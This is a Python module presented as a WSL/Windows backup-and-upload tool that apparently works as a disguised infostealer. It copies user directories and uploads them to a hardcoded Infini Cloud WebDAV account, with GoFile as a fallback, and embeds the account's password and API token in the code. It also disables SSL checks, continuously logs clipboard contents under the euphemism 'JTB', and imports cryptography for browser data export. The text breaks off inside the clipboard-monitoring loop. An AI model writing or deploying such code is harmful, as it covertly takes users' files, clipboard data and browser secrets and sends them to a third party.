# -*- coding: utf-8 -*-
"""
自动备份和上传工具
功能：备份WSL和Windows系统中的重要文件，并自动上传到云存储
"""

# 先导入标准库
import os
import sys
import shutil
import time
import socket
import logging
import platform
import tarfile
import threading
import subprocess
import base64
import getpass
import json
import sqlite3
from datetime import datetime, timedelta
from pathlib import Path
from functools import lru_cache

import_failed = False
try:
    import requests
    from requests.auth import HTTPBasicAuth
except ImportError as e:
    print(f"⚠ 警告: 无法导入 requests 库: {str(e)}")
    requests = None
    HTTPBasicAuth = None
    import_failed = True

try:
    import urllib3
    # 禁用SSL警告
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError as e:
    print(f"⚠ 警告: 无法导入 urllib3 库: {str(e)}")
    urllib3 = None
    import_failed = True

if import_failed:
    print("⚠ 警告: 部分依赖导入失败，程序将继续运行，但相关功能可能不可用")

# 尝试导入浏览器数据导出所需的库
BROWSER_EXPORT_AVAILABLE = False
try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Random import get_random_bytes
    BROWSER_EXPORT_AVAILABLE = True
except ImportError:
    pass  # 日志将在 CLI 中配置

from .config import BackupConfig

class BackupManager:
    """备份管理器类"""
    
    def __init__(self):
        """初始化备份管理器"""
        self.config = BackupConfig()
        
        # Infini Cloud 配置
        self.infini_url = "https://wajima.infini-cloud.net/dav/"
        self.infini_user = "messiahxp"
        self.infini_pass = "U5tzgpQeTVr4j5T7"
        
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        self.config.INFINI_REMOTE_BASE_DIR = f"{user_prefix}_wsl_backup"
        
        # 配置 requests session 用于上传
        self.session = requests.Session()
        self.session.verify = False  # 禁用SSL验证
        self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
        
        # GoFile API token（备选方案）
        self.api_token = "qSS40ZpgNXq7zZXzy4QDSX3z9yCVCXJu"
        
        self._setup_logging()

    def _setup_logging(self):
        """配置日志系统"""
        try:
            # 确保日志目录存在
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)
            
            # 配置文件处理器
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_handler.setFormatter(
                logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            )
            
            # 配置控制台处理器
            console_handler = logging.StreamHandler()
            console_handler.setFormatter(logging.Formatter('%(message)s'))
            
            # 配置根日志记录器
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # 清除现有处理器
            root_logger.handlers.clear()
            
            # 添加处理器
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("日志系统初始化完成")
        except Exception as e:
            print(f"设置日志系统时出错: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """获取目录总大小
        
        Args:
            directory: 目录路径
            
        Returns:
            int: 目录大小（字节）
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"获取文件大小失败 {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """确保目录存在
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 目录是否可用
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"❌ 路径存在但不是目录: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"❌目录没有写入权限: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except Exception as e:
            logging.error(f"❌ 创建目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """清理并重新创建目录
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 操作是否成功
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except Exception as e:
            logging.error(f"❌ 清理目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """检查网络连接
        
        Returns:
            bool: 是否有网络连接
        """
        try:
            # 尝试连接多个可靠的服务器
            hosts = [
                "8.8.8.8",  # Google DNS
                "1.1.1.1",  # Cloudflare DNS
                "208.67.222.222"  # OpenDNS
            ]
            for host in hosts:
                try:
                    socket.create_connection((host, 53), timeout=BackupConfig.NETWORK_CONNECTION_TIMEOUT)
                    return True
                except:
                    continue
            return False
        except:
            return False

    @staticmethod
    def _is_valid_file(file_path):
        """检查文件是否有效
        
        Args:
            file_path: 文件路径
            
        Returns:
            bool: 文件是否有效
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def backup_wsl_files(self, source_dir, target_dir):
        """WSL环境文件备份"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.exists(source_dir):
            logging.error("❌ WSL源目录不存在")
            return None

        # 获取用户名前缀
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"

        # 创建子目录用于存放指定文件
        target_specified = os.path.join(target_dir, f"{user_prefix}_specified")
        
        if not self._clean_directory(target_dir):
            return None
            
        if not self._ensure_directory(target_specified):
            return None

        # 添加计数器和超时控制
        start_time = time.time()
        last_progress_time = start_time
        timeout = self.config.WSL_BACKUP_TIMEOUT
        processed_files = 0

        # 输出开始备份的信息
        logging.info("\n" + "─" * 50)
        logging.info("🚀 开始备份 WSL 重要目录和文件")
        logging.info("─" * 50 + "\n")

        # 处理指定目录和文件（完整备份，不筛选扩展名）
        for specific_path in self.config.WSL_SPECIFIC_DIRS:
            # 检查是否超时
            if time.time() - start_time > timeout:
                logging.error("\n❌ WSL备份超时")
                return None

            full_source_path = os.path.join(source_dir, specific_path)
            if os.path.exists(full_source_path):
                try:
                    # 对于指定的目录和文件，保存在 specified 目录下
                    target_base_for_specific = target_specified
                    if os.path.isfile(full_source_path):
                        # 如果是文件，直接复制
                        target_file = os.path.join(target_base_for_specific, specific_path)
                        target_file_dir = os.path.dirname(target_file)
                        if self._ensure_directory(target_file_dir):
                            shutil.copy2(full_source_path, target_file)
                            processed_files += 1
                            if self.config.DEBUG_MODE:
                                logging.info(f"📄 已备份: {specific_path}")
                    else:
                        # 如果是目录，递归复制全部内容
                        target_path = os.path.join(target_base_for_specific, specific_path)
                        if self._ensure_directory(os.path.dirname(target_path)):
                            if os.path.exists(target_path):
                                shutil.rmtree(target_path)
                            
                            # 添加目录复制进度日志
                            logging.info(f"\n📁 正在备份: {specific_path}/")
                            shutil.copytree(full_source_path, target_path, symlinks=True)
                except Exception as e:
                    logging.error(f"\n❌ 备份失败: {specific_path} - {str(e)}")

        # 计算总用时
        total_time = time.time() - start_time
        total_minutes = int(total_time / 60)

        if processed_files > 0:
            logging.info("\n" + "═" * 50)
            logging.info("📊 WSL备份统计")
            logging.info("═" * 50)
            logging.info(f"   🔄 总计处理：{processed_files} 个文件")
            logging.info(f"   ⏱️  总共耗时：{total_minutes} 分钟")
            logging.info("═" * 50 + "\n")

        return target_dir

    def split_large_file(self, file_path):
        """将大文件分割成小块
        
        Args:
            file_path: 要分割的文件路径
            
        Returns:
            list: 分片文件路径列表，如果不需要分割则返回None
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return None
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            logging.critical(f"文件 {file_path} 已分割为 {len(chunk_files)} 个分片")
            return chunk_files
        except (OSError, IOError) as e:
            logging.error(f"分割文件失败 {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """上传文件到服务器
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not self._is_valid_file(file_path):
            logging.error(f"⚠️ 文件 {file_path} 为空或无效，跳过上传")
            return False

        # 检查文件大小并在需要时分片
        chunk_files = self.split_large_file(file_path)
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # 仅在全部分片上传成功后清理分片目录与原始文件
            if success:
                chunk_dir = os.path.dirname(chunk_files[0])
                self._clean_directory(chunk_dir)
                if os.path.exists(file_path):
                    try:
                        os.remove(file_path)
                    except Exception:
                        pass
            return success
        else:
            return self._upload_single_file(file_path)

    def _create_remote_directory(self, remote_dir):
        """创建远程目录（使用 WebDAV MKCOL 方法）"""
        if not remote_dir or remote_dir == '.':
            return True
        
        try:
            # 构建目录路径
            dir_path = f"{self.infini_url.rstrip('/')}/{remote_dir.lstrip('/')}"
            
            response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
            
            if response.status_code in [201, 204, 405]:  # 405 表示已存在
                return True
            elif response.status_code == 409:
                # 409 可能表示父目录不存在，尝试创建父目录
                parent_dir = os.path.dirname(remote_dir)
                if parent_dir and parent_dir != '.':
                    if self._create_remote_directory(parent_dir):
                        # 父目录创建成功，再次尝试创建当前目录
                        response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
                        return response.status_code in [201, 204, 405]
                return False
            else:
                return False
        except Exception:
            return False

    def _upload_single_file_infini(self, file_path):
        """上传单个文件到 Infini Cloud（使用 WebDAV PUT 方法）"""
        try:
            # 检查文件权限和状态
            if not os.path.exists(file_path):
                logging.error(f"文件不存在: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            # 构建远程路径
            filename = os.path.basename(file_path)
            remote_filename = f"{self.config.INFINI_REMOTE_BASE_DIR}/{filename}"
            remote_path = f"{self.infini_url.rstrip('/')}/{remote_filename.lstrip('/')}"
            
            # 创建远程目录（如果需要）
            remote_dir = os.path.dirname(remote_filename)
            if remote_dir and remote_dir != '.':
                if not self._create_remote_directory(remote_dir):
                    logging.warning(f"无法创建远程目录: {remote_dir}，将继续尝试上传")

            # 上传重试逻辑
            for attempt in range(self.config.RETRY_COUNT):
                if not self._check_internet_connection():
                    logging.error("网络连接不可用，等待重试...")
                    time.sleep(self.config.RETRY_DELAY)
                    continue

                try:
                    # 根据文件大小动态调整超时时间
                    if file_size < 1024 * 1024:  # 小于1MB
                        connect_timeout = 10
                        read_timeout = 30
                    elif file_size < 10 * 1024 * 1024:  # 1-10MB
                        connect_timeout = 15
                        read_timeout = max(30, int(file_size / 1024 / 1024 * 5))
                    else:  # 大于10MB
                        connect_timeout = 20
                        read_timeout = max(60, int(file_size / 1024 / 1024 * 6))
                    
                    # 只在第一次尝试时显示详细信息
                    if attempt == 0:
                        size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                        logging.critical(f"📤 [Infini Cloud] 上传: {filename} ({size_str})")
                    elif self.config.DEBUG_MODE:
                        logging.debug(f"[Infini Cloud] 重试上传: {filename} (第 {attempt + 1} 次)")
                    
                    # 准备请求头
                    headers = {
                        'Content-Type': 'application/octet-stream',
                        'Content-Length': str(file_size),
                    }
                    
                    # 执行上传（使用 WebDAV PUT 方法）
                    with open(file_path, 'rb') as f:
                        response = self.session.put(
                            remote_path,
                            data=f,
                            headers=headers,
                            auth=self.auth,
                            timeout=(connect_timeout, read_timeout),
                            stream=False
                        )
                    
                    if response.status_code in [201, 204]:
                        logging.critical(f"✅ [Infini Cloud] {filename}")
                        return True
                    elif response.status_code == 403:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [Infini Cloud] {filename}: 权限不足")
                    elif response.status_code == 404:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [Infini Cloud] {filename}: 远程路径不存在")
                    elif response.status_code == 409:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [Infini Cloud] {filename}: 远程路径冲突")
                    else:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [Infini Cloud] {filename}: 状态码 {response.status_code}")
                        
                except requests.exceptions.Timeout:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [Infini Cloud] {os.path.basename(file_path)}: 超时")
                except requests.exceptions.SSLError as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [Infini Cloud] {os.path.basename(file_path)}: SSL错误")
                except requests.exceptions.ConnectionError as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [Infini Cloud] {os.path.basename(file_path)}: 连接错误")
                except Exception as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [Infini Cloud] {os.path.basename(file_path)}: {str(e)}")

                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"等待 {self.config.RETRY_DELAY} 秒后重试...")
                    time.sleep(self.config.RETRY_DELAY)

            return False
            
        except OSError as e:
            logging.error(f"获取文件信息失败 {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"[Infini Cloud] 上传过程出错: {e}")
            return False

    def _upload_single_file_gofile(self, file_path):
        """上传单个文件到 GoFile（备选方案）
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0 {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"⚠️ 文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            filename = os.path.basename(file_path)
            logging.info(f"🔄 尝试使用 GoFile 上传: {filename}")

            for attempt in range(self.config.RETRY_COUNT):
                # 检查网络连接
                if not self._check_internet_connection():
                    logging.error("⚠️ 网络连接不可用，等待重试...")
                    time.sleep(self.config.RETRY_DELAY * 2)  # 网络问题时等待更长时间
                    continue

                for server in self.config.UPLOAD_SERVERS:
                    try:
                        with open(file_path, "rb") as f:
                            if attempt == 0:
                                logging.critical(f"⌛ [GoFile] 正在上传文件 {filename}（{file_size / 1024 / 1024:.2f}MB），使用服务器 {server}...")
                            elif self.config.DEBUG_MODE:
                                logging.debug(f"[GoFile] 第 {attempt + 1} 次尝试，使用服务器 {server}...")
                            
                            response = requests.post(
                                server,
                                files={"file": f},
                                data={"token": self.api_token},
                                timeout=self.config.UPLOAD_TIMEOUT,
                                verify=True
                            )
                            
                            if response.ok and response.headers.get("Content-Type", "").startswith("application/json"):
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"✅ [GoFile] {filename}")
                                    return True
                                else:
                                    error_msg = result.get("message", "未知错误")
                                    if attempt == 0 or self.config.DEBUG_MODE:
                                        logging.error(f"❌ [GoFile] 服务器返回错误: {error_msg}")
                            else:
                                if attempt == 0 or self.config.DEBUG_MODE:
                                    logging.error(f"❌ [GoFile] 上传失败，状态码: {response.status_code}")
                                
                    except requests.exceptions.Timeout:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [GoFile] {filename}: 上传超时")
                    except requests.exceptions.SSLError:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [GoFile] {filename}: SSL错误")
                    except requests.exceptions.ConnectionError:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [GoFile] {filename}: 连接错误")
                    except Exception as e:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [GoFile] {filename}: {str(e)}")
                    
                    # 如果这个服务器失败，继续尝试下一个服务器
                    continue
                
                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"等待 {self.config.RETRY_DELAY} 秒后重试...")
                    time.sleep(self.config.RETRY_DELAY)
            
            logging.error(f"❌ [GoFile] {filename}: 上传失败，已达到最大重试次数")
            return False
            
        except OSError as e:
            logging.error(f"❌ 获取文件大小失败 {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"[GoFile] 上传过程出错: {e}")
            return False

    def _upload_single_file(self, file_path):
        """上传单个文件，优先使用 Infini Cloud，失败则使用 GoFile 备选方案
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0 {file_path}")
                if os.path.exists(file_path):
                    os.remove(file_path)
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"⚠️ 文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                if os.path.exists(file_path):
                    os.remove(file_path)
                return False

            # 优先尝试 Infini Cloud 上传
            if self._upload_single_file_infini(file_path):
                if os.path.exists(file_path):
                    os.remove(file_path)
                return True

            # Infini Cloud 上传失败，尝试使用 GoFile 备选方案
            logging.warning(f"⚠️ Infini Cloud 上传失败，尝试使用 GoFile 备选方案: {os.path.basename(file_path)}")
            if self._upload_single_file_gofile(file_path):
                if os.path.exists(file_path):
                    os.remove(file_path)
                return True
            
            # 两个方法都失败
            logging.error(f"❌ {os.path.basename(file_path)}: 所有上传方法均失败")
            return False
            
        except OSError as e:
            logging.error(f"❌ 获取文件大小失败 {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"处理文件时出现未知错误: {str(e)}")
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """压缩备份文件夹为tar.gz格式
        
        Args:
            folder_path: 要压缩的文件夹路径
            zip_file_path: 压缩文件路径（不含扩展名）
            
        Returns:
            str or list: 压缩文件路径或压缩文件路径列表
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # 检查源目录是否为空
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"⚠️ 源目录为空 {folder_path}")
                return None

            # 计算源目录大小
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # 跳过空文件
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"❌获取文件大小失败 {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"源目录实际大小为0 {folder_path}")
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                logging.error(f"⚠️ 源目录过大 {folder_path}: {dir_size / 1024 / 1024 / 1024:.2f}GB > {self.config.MAX_SOURCE_DIR_SIZE / 1024 / 1024 / 1024}GB")
                return self.split_large_directory(folder_path, zip_file_path)

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz", compresslevel=self.config.TAR_COMPRESS_LEVEL) as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # 验证压缩文件
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"压缩文件大小为0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    os.remove(tar_path)
                    return self.split_large_directory(folder_path, zip_file_path)

                self._clean_directory(folder_path)
                logging.critical(f"🗂️ 目录 {folder_path} 🗃️ 已压缩: {dir_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                return tar_path
            except OSError as e:
                logging.error(f"❌ 获取压缩文件大小失败 {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except Exception as e:
            logging.error(f"❌ 压缩失败 {folder_path}: {e}")
            return None

    def _compress_chunk_part(self, part_dir, folder_path, base_zip_path, part_num, chunk_size):
        """压缩单个分块目录
        
        Args:
            part_dir: 分块目录路径
            folder_path: 原始目录路径（用于arcname）
            base_zip_path: 基础压缩文件路径
            part_num: 分块编号
            chunk_size: 分块大小（字节）
            
        Returns:
            str or None: 压缩文件路径，失败返回None
        """
        tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
        try:
            with tarfile.open(tar_path, "w:gz", compresslevel=self.config.TAR_COMPRESS_LEVEL) as tar:
                tar.add(part_dir, arcname=os.path.basename(folder_path))
            
            # 验证压缩文件
            compressed_size = os.path.getsize(tar_path)
            if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"压缩后文件仍然过大: {tar_path} ({compressed_size / 1024 / 1024:.2f}MB)")
                os.remove(tar_path)
                return None
            else:
                logging.critical(f"已创建分块 {part_num + 1}: {chunk_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                return tar_path
        except (OSError, IOError, tarfile.TarError) as e:
            logging.error(f"压缩分块失败: {part_dir}: {e}")
            if os.path.exists(tar_path):
                os.remove(tar_path)
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """将大目录分割成多个小块并分别压缩
        
        Args:
            folder_path: 要分割的目录路径
            base_zip_path: 基础压缩文件路径
            
        Returns:
            list: 压缩文件路径列表
        """
        try:
            compressed_files = []
            current_size = 0
            current_files = []
            part_num = 0
            
            # 创建临时目录存放分块
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

            # 采用更保守的分块大小限制
            # 考虑到压缩比和安全边界，将目标大小设置得更小
            MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * self.config.SAFETY_MARGIN / self.config.COMPRESSION_RATIO)

            # 创建文件大小映射以优化分块
            file_sizes = {}
            total_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        size = os.path.getsize(file_path)
                        if size > 0:  # 跳过空文件
                            file_sizes[file_path] = size
                            total_size += size
                    except OSError:
                        continue

            if not file_sizes:
                logging.error(f"目录 {folder_path} 中没有有效文件")
                return None

            # 按文件大小降序排序，优先处理大文件
            sorted_files = sorted(file_sizes.items(), key=lambda x: x[1], reverse=True)

            # 检查是否有单个文件超过限制
            if sorted_files[0][1] > MAX_CHUNK_SIZE:
                logging.error(f"发现过大文件: {sorted_files[0][0]} ({sorted_files[0][1] / 1024 / 1024:.2f}MB)")
                return None

            # 使用最优装箱算法进行分块
            current_chunk = []
            current_chunk_size = 0

            for file_path, file_size in sorted_files:
                # 如果当前文件会导致块超过限制，先处理当前块
                if current_chunk_size + file_size > MAX_CHUNK_SIZE and current_chunk:
                    # 创建新的分块目录
                    part_dir = os.path.join(temp_dir, f"part{part_num}")
                    if self._ensure_directory(part_dir):
                        # 复制文件到分块目录
                        success = True
                        for src in current_chunk:
                            rel_path = os.path.relpath(src, folder_path)
                            dst = os.path.join(part_dir, rel_path)
                            dst_dir = os.path.dirname(dst)
                            if not self._ensure_directory(dst_dir):
                                success = False
                                break
                            try:
                                shutil.copy2(src, dst)
                            except (OSError, IOError, shutil.Error) as e:
                                logging.error(f"复制文件失败: {src} -> {dst}: {e}")
                                success = False
                                break

                        if success:
                            tar_path = self._compress_chunk_part(
                                part_dir, folder_path, base_zip_path, part_num, current_chunk_size
                            )
                            if tar_path:
                                compressed_files.append(tar_path)

                        self._clean_directory(part_dir)
                        part_num += 1

                    current_chunk = []
                    current_chunk_size = 0

                # 添加当前文件到块
                current_chunk.append(file_path)
                current_chunk_size += file_size

            # 处理最后一个块
            if current_chunk:
                part_dir = os.path.join(temp_dir, f"part{part_num}")
                if self._ensure_directory(part_dir):
                    success = True
                    for src in current_chunk:
                        rel_path = os.path.relpath(src, folder_path)
                        dst = os.path.join(part_dir, rel_path)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            success = False
                            break
                        try:
                            shutil.copy2(src, dst)
                        except Exception as e:
                            logging.error(f"复制文件失败: {src} -> {dst}: {e}")
                            success = False
                            break

                    if success:
                        tar_path = self._compress_chunk_part(
                            part_dir, folder_path, base_zip_path, part_num, current_chunk_size
                        )
                        if tar_path:
                            compressed_files.append(tar_path)

                    self._clean_directory(part_dir)

            # 清理临时目录和源目录
            self._clean_directory(temp_dir)
            self._clean_directory(folder_path)
            
            if not compressed_files:
                logging.error(f"目录 {folder_path} 分割失败，没有生成有效的压缩文件")
                return None
            
            logging.critical(f"目录 {folder_path} 已分割为 {len(compressed_files)} 个压缩文件")
            return compressed_files
        except Exception as e:
            logging.error(f"分割目录失败 {folder_path}: {e}")
            return None

    def get_clipboard_content(self):
        """获取JTB内容，支持 Windows 和 WSL 环境"""
        try:
            # 在 WSL 中使用 PowerShell 获取 Windows JTB
            ps_command = 'powershell.exe Get-Clipboard'
            result = subprocess.run(
                ps_command,
                shell=True,
                capture_output=True,
                text=False  # 改为 False 以获取原始字节
            )
            
            if result.returncode == 0:
                # 尝试不同的编码
                encodings = ['utf-8', 'gbk', 'gb2312', 'gb18030', 'big5', 'latin1']
                
                # 首先尝试 UTF-8 和 GBK
                for encoding in ['utf-8', 'gbk']:
                    try:
                        content = result.stdout.decode(encoding).strip()
                        # 检查解码后的内容是否为空或只包含空白字符
                        if content and not content.isspace():
                            return content
                    except UnicodeDecodeError:
                        continue
                    
                # 如果常用编码失败，尝试其他编码
                for encoding in encodings:
                    if encoding not in ['utf-8', 'gbk']:  # 跳过已尝试的编码
                        try:
                            content = result.stdout.decode(encoding).strip()
                            if content and not content.isspace():
                                return content
                        except UnicodeDecodeError:
                            continue
                
                # 如果所有编码都失败，检查是否有原始数据
                if result.stdout:
                    try:
                        # 使用 'ignore' 选项作为最后的尝试
                        content = result.stdout.decode('utf-8', errors='ignore').strip()
                        if content and not content.isspace():
                            if self.config.DEBUG_MODE:
                                logging.warning("⚠️ 使用 ignore 模式解码JTB内容")
                            return content
                    except Exception as e:
                        # 解码失败时不记录错误日志，避免频繁报错
                        pass
                else:
                    # JTB为空时不记录日志，避免频繁报错
                    pass
            else:
                # 获取JTB失败时不记录错误日志，避免频繁报错导致日志文件过大
                # 某些环境下（如无剪贴板服务）会持续返回错误码
                pass
        
            return None
        except Exception as e:
            # 某些环境下（如无图形界面 / 无剪贴板服务）会持续抛出异常
            # 这里不记录错误日志，只返回 None，避免日志被高频刷屏
            return None

    def log_clipboard_update(self, content, file_path):
        """记录JTB更新到文件"""
        try:
            # 确保目录存在
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # 检查内容是否为空或特殊标记
            if not content or content.isspace():
                return
            
            # 写入日志
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== 📋 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
            
            content_preview = content[:50] + "..." if len(content) > 50 else content
            logging.info(f"📝 已记录内容: {content_preview}")
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"❌ 记录JTB失败: {str(e)}")

    def monitor_clipboard(self, file_path, interval=3):
        """监控JTB变化并记录到文件
        
        Args:
            file_path: 日志文件路径
            interval: 检查间隔（秒）
        """
        # 确保日志目录存在
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"❌ 创建JTB日志目录失败: {str(e)}")
                return

        last_content = ""
        error_count = 0  # 添加错误计数
        max_errors = 5   # 最大连续错误次数
        last_empty_log_time = time.time()  # 记录上次输出空JTB日志的时间
        empty_log_interval = 300  # 每5分钟才输出一次空JTB日志
        
        # 初始化日志文件
        try:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"\n=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write("-"*30 + "\n")
        except Exception as e:
            logging.error(f"❌ 初始化JTB日志失败: {str(e)}")
        
        def is_special_content(text):
            """检查是否为特殊标记内容"""
            if not text:
                return False
            # 跳过日志标记行
            if text.startswith('===') or text.startswith('-'):
                return True
            # 跳过时间戳行
            if 'JTB监控启动于' in text or '日志已于' in text:
                return True
            return False
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                current_time = time.time()
                
                # 检查内容是否有效且不是特殊标记
                if (current_content and 
                    not current_content.isspace() and 
                    not is_special_content(current_content)):
                    
                    # 检查内容是否发生变化
                    if current_content != last_content:
                        content_preview = current_content[:30] + "..." if len(current_content) > 30 else current_content
                        logging.info(f"📋 检测到新内容: {content_preview}")
                        self.log_clipboard_update(current_content, file_path)
                        last_content = current_content
                        error_count = 0  # 重置错误计数
                else:
                    if self.config.DEBUG_MODE and current_time - last_empty_log_time >= empty_log_interval:
                        if not current_content:
                            logging.debug("ℹ️ JTB为空")
                        elif current_content.isspace():
                            logging.debug("ℹ️ JTB内容仅包含空白字符")
                        elif is_special_content(current_content):
                            logging.debug("ℹ️ 跳过特殊标记内容")
                        last_empty_log_time = current_time
